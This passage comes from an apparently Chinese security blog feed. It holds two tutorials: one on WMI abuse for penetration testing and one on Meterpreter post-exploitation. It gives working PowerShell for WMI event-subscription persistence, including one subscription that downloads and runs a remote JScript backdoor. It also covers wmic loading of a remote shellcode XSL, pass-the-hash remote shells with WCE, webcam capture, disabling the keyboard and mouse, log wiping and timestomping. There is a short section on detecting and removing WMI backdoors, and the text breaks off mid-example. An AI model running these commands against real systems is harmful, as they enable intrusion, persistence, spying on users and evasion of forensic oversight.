class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$VMwareDetected = $False</span><br><span class="line">$VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter &apos;Manufacturer LIKE</span><br><span class="line">&quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&apos;</span><br><span class="line">$VMBios = Get-WmiObject Win32_BIOS -Filter &apos;SerialNumber LIKE &quot;%VMware%&quot;&apos;</span><br><span class="line">$VMToolsRunning = Get-WmiObject Win32_Process -Filter &apos;Name=&quot;vmtoolsd.exe&quot;&apos;</span><br><span class="line">if ($VMAdapter -or $VMBios -or $VMToolsRunning) </span><br><span class="line">&#123; $VMwareDetected = $True </span><br><span class="line">&quot;in vm&quot;</span><br><span class="line">&#125; </span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">&quot;not in vm&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="存储payload">存储payload</span></h4><p>【管理员权限】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,</span><br><span class="line">$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_EvilClass&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_18.png" alt="wmic_18"></p><p><strong>Tips：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可加密存储于此位置，执行时解密运行，达到硬盘不存文件的效果</span><br></pre></td></tr></table></figure><h4><span id="隐蔽定时启动程序">隐蔽定时启动程序</span></h4><p>【管理员权限】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$filterName = &apos;BotFilter82&apos;</span><br><span class="line">$consumerName = &apos;BotConsumer23&apos;</span><br><span class="line">$exePath = &apos;C:\Windows\System32\notepad.exe&apos;</span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE</span><br><span class="line">TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;</span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=</span><br><span class="line">$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop</span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath&#125;</span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=</span><br><span class="line">$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_19.png" alt="wmic_19"></p><p>查看进程：</p><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1553239184506.png" alt="1553239184506"></p><p>每60s执行一次notepad.exe</p><h4><span id="远程下载js脚本">远程下载js脚本</span></h4><p>通过远程下载js脚本，进行命令调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!powershell</span><br><span class="line">$filterName = &apos;filtP1&apos;</span><br><span class="line">$consumerName = &apos;consP1&apos;</span><br><span class="line">$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot;    </span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;    </span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop    </span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125;    </span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_22.png" alt="wmic_22"></p><h3><span id="wmi后门检测及清除">WMI后门检测及清除</span></h3><h4><span id="查看当前wmi-event">查看当前WMI Event</span></h4><p>【管理员权限】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#List Event Filters</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br><span class="line"></span><br><span class="line">#List Event Consumers</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br><span class="line"></span><br><span class="line">#List Event Bindings</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_21.png" alt="wmic_21"></p><h4><span id="清除后门">清除后门</span></h4><p>【管理员权限】</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Filter</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&apos;BotFilter82&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Consumer</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&apos;BotConsumer23&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Binding</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &apos;%</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_19.png" alt="wmic_19"></p><h3><span id="wmiexecvbs">wmiexec.vbs</span></h3><p>WMIEXEC是用VBS脚本调用WMI来模拟psexec的功能</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_23.png" alt="wmic_23"></p><p>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。<br>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p><h4><span id="半交互shell模式">半交互shell模式</span></h4><p>提供账号密码，执行如下命令： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_24.png" alt="wmic_24"></p><p>这样就获得了一个半交互式的shell，这个shell和psexec的shell没什么区别。之所以称为半交互式，是因为这个shell也不能执行实时交互的命令，和psexec是一样的。</p><p>如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。</p><p>利用wce抓取hash:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -l</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_25.png" alt="wmic_25"></p><p>利用wce进行hash注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -s Administrator:WIN-2003:F67CE55AC831223DC187B8085FE1D9DF:45A524862326CB9E7D85AF4017A000F0</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_26.png" alt="wmic_26"></p><h4><span id="单个命令执行的模式">单个命令执行的模式</span></h4><p>这个模式适用于只需要执行一个命令，或者说当前的环境不是交互式shell，没法运行WMIEXEC的shell模式时（比如在webshell里面)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  &quot;command&quot;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_27.png" alt="wmic_27"></p><h3><span id="wmic调用xsl文件">wmic调用xsl文件</span></h3><p>本地：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list /FORMAT:evil.xsl</span><br></pre></td></tr></table></figure><p>远程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /FORMAT:&quot;https://example.com/evil.xsl&quot;</span><br></pre></td></tr></table></figure><p>xsl文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method=&quot;text&quot;/&gt;</span><br><span class="line">    &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">    ]]&gt; &lt;/ms:script&gt;</span><br><span class="line">&lt;/stylesheet&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl&quot;</span><br></pre></td></tr></table></figure><p>执行成功，成功弹出计算器，如下图</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_28.png" alt="wmic_28"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;wmi&quot;&gt;WMI&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。而
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>后渗透之meterpreter使用攻略</title>
    <link href="https://uknowsec.cn/posts/uncategorized/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8Bmeterpreter%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5.html"/>
    <id>https://uknowsec.cn/posts/uncategorized/后渗透之meterpreter使用攻略.html</id>
    <published>2018-12-20T05:46:30.000Z</published>
    <updated>2019-01-07T08:24:19.651Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="系统命令">系统命令</span></h2><h3><span id="基本系统命令">基本系统命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">run  #执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info #查看已有模块信息</span><br><span class="line">getuid # 查看权限 </span><br><span class="line">getpid # 获取当前进程的pid</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line">reboot / shutdown   #重启/关机</span><br><span class="line">shell #进入目标机cmd shell</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 2852</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-7</span><br><span class="line">OS              : Windows 7 (Build 7600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : UKNOWSEC</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                     Arch  Session  User        Path</span><br><span class="line"> ---   ----  ----                     ----  -------  ----        ----</span><br><span class="line"> 0     0     [System Process]                                    </span><br><span class="line"> 4     0     System                                              </span><br><span class="line"> 248   500   svchost.exe                                         </span><br><span class="line"> 268   4     smss.exe                                            </span><br><span class="line"> 356   348   csrss.exe                                           </span><br><span class="line"> 396   348   wininit.exe                                         </span><br><span class="line"> 404   388   csrss.exe                                           </span><br><span class="line"> 440   388   winlogon.exe                                        </span><br><span class="line"> 500   396   services.exe                                        </span><br><span class="line"> 508   396   lsass.exe                                           </span><br><span class="line"> 516   396   lsm.exe                                             </span><br><span class="line"> 628   500   svchost.exe                                         </span><br><span class="line"> 648   500   svchost.exe                                         </span><br><span class="line"> 688   500   vmacthlp.exe                                        </span><br><span class="line"> 732   500   svchost.exe                                         </span><br><span class="line"> 772   500   svchost.exe                                         </span><br><span class="line"> 832   500   TrustedInstaller.exe                                </span><br><span class="line"> 860   500   svchost.exe                                         </span><br><span class="line"> 900   500   svchost.exe                                         </span><br><span class="line"> 1084  500   spoolsv.exe                                         </span><br><span class="line"> 1112  500   svchost.exe                                         </span><br><span class="line"> 1260  500   svchost.exe                                         </span><br><span class="line"> 1272  500   sppsvc.exe                                          </span><br><span class="line"> 1356  500   VGAuthService.exe                                   </span><br><span class="line"> 1396  628   WmiPrvSE.exe                                        </span><br><span class="line"> 1548  500   vmtoolsd.exe                                        </span><br><span class="line"> 1764  500   ManagementAgentHost.exe                             </span><br><span class="line"> 1780  500   wmpnetwk.exe                                        </span><br><span class="line"> 1908  500   svchost.exe                                         </span><br><span class="line"> 2036  500   msdtc.exe                                           </span><br><span class="line"> 2348  404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe</span><br><span class="line"> 2356  2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe</span><br><span class="line"> 2532  500   svchost.exe                                         </span><br><span class="line"> 2684  500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2736  860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe</span><br><span class="line"> 2752  2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe</span><br><span class="line"> 2852  3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe</span><br><span class="line"> 2876  2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 3048  500   SearchIndexer.exe                                   </span><br><span class="line"> 3816  900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe</span><br><span class="line"> 3824  500   svchost.exe                                         </span><br><span class="line"></span><br><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle for: 14 mins 20 secs</span><br></pre></td></tr></table></figure><h3><span id="uictl开关键盘鼠标">uictl开关键盘/鼠标</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; uictl disable mouse</span><br><span class="line">Disabling mouse...</span><br><span class="line">meterpreter &gt; uictl disable keyboard</span><br><span class="line">Disabling keyboard...</span><br><span class="line">meterpreter &gt; uictl enable mouse</span><br><span class="line">Enabling mouse...</span><br><span class="line">meterpreter &gt; uictl enable keyboard</span><br><span class="line">Enabling keyboard...</span><br></pre></td></tr></table></figure><h3><span id="webcam摄像头命令">webcam摄像头命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  #查看摄像头</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br></pre></td></tr></table></figure><h3><span id="execute执行文件">execute执行文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -i -f cmd.exe</span><br><span class="line">Process 3616 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\Win7\Desktop&gt;</span><br></pre></td></tr></table></figure><h3><span id="migrate进程迁移">migrate进程迁移</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 2852</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                     Arch  Session  User        Path</span><br><span class="line"> ---   ----  ----                     ----  -------  ----        ----</span><br><span class="line"> 0     0     [System Process]                                    </span><br><span class="line"> 4     0     System                                              </span><br><span class="line"> 248   500   svchost.exe                                         </span><br><span class="line"> 268   4     smss.exe                                            </span><br><span class="line"> 356   348   csrss.exe                                           </span><br><span class="line"> 396   348   wininit.exe                                         </span><br><span class="line"> 404   388   csrss.exe                                           </span><br><span class="line"> 440   388   winlogon.exe                                        </span><br><span class="line"> 500   396   services.exe                                        </span><br><span class="line"> 508   396   lsass.exe                                           </span><br><span class="line"> 516   396   lsm.exe                                             </span><br><span class="line"> 628   500   svchost.exe                                         </span><br><span class="line"> 648   500   svchost.exe                                         </span><br><span class="line"> 688   500   vmacthlp.exe                                        </span><br><span class="line"> 732   500   svchost.exe                                         </span><br><span class="line"> 772   500   svchost.exe                                         </span><br><span class="line"> 832   500   TrustedInstaller.exe                                </span><br><span class="line"> 860   500   svchost.exe                                         </span><br><span class="line"> 900   500   svchost.exe                                         </span><br><span class="line"> 1084  500   spoolsv.exe                                         </span><br><span class="line"> 1112  500   svchost.exe                                         </span><br><span class="line"> 1260  500   svchost.exe                                         </span><br><span class="line"> 1272  500   sppsvc.exe                                          </span><br><span class="line"> 1356  500   VGAuthService.exe                                   </span><br><span class="line"> 1396  628   WmiPrvSE.exe                                        </span><br><span class="line"> 1548  500   vmtoolsd.exe                                        </span><br><span class="line"> 1764  500   ManagementAgentHost.exe                             </span><br><span class="line"> 1780  500   wmpnetwk.exe                                        </span><br><span class="line"> 1908  500   svchost.exe                                         </span><br><span class="line"> 2036  500   msdtc.exe                                           </span><br><span class="line"> 2348  404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe</span><br><span class="line"> 2356  2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe</span><br><span class="line"> 2504  2752  calc.exe                 x64   1        WIN-7\Win7  C:\Windows\System32\calc.exe</span><br><span class="line"> 2532  500   svchost.exe                                         </span><br><span class="line"> 2684  500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2736  860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe</span><br><span class="line"> 2752  2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe</span><br><span class="line"> 2852  3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe</span><br><span class="line"> 2876  2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 3048  500   SearchIndexer.exe                                   </span><br><span class="line"> 3316  772   audiodg.exe              x64   0                    </span><br><span class="line"> 3816  900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe</span><br><span class="line"> 3824  500   svchost.exe                                         </span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate 2876</span><br><span class="line">[*] Migrating from 3504 to 2876...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure><h3><span id="clearev清除日志">clearev清除日志</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 365 records from Application...</span><br><span class="line">[*] Wiping 1222 records from System...</span><br><span class="line">[*] Wiping 404 records from Security...</span><br></pre></td></tr></table></figure><h2><span id="文件系统命令">文件系统命令</span></h2><h3><span id="基本文件系统命令">基本文件系统命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getwd 或者pwd # 查看当前工作目录  </span><br><span class="line">ls</span><br><span class="line">cd</span><br><span class="line">search -f *pass*       # 搜索文件  -h查看帮助</span><br><span class="line">cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容</span><br><span class="line">upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上</span><br><span class="line">edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件</span><br><span class="line">rm C:\\lltest\\hack.txt</span><br><span class="line">mkdir lltest2  #只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  #只能删除当前目录下文件夹</span><br><span class="line">getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</span><br><span class="line">lcd /tmp   #操作攻击者主机 切换目录</span><br></pre></td></tr></table></figure><h3><span id="timestomp伪造时间戳">timestomp伪造时间戳</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; timestomp -v C://2.txt</span><br><span class="line">[*] Showing MACE attributes for 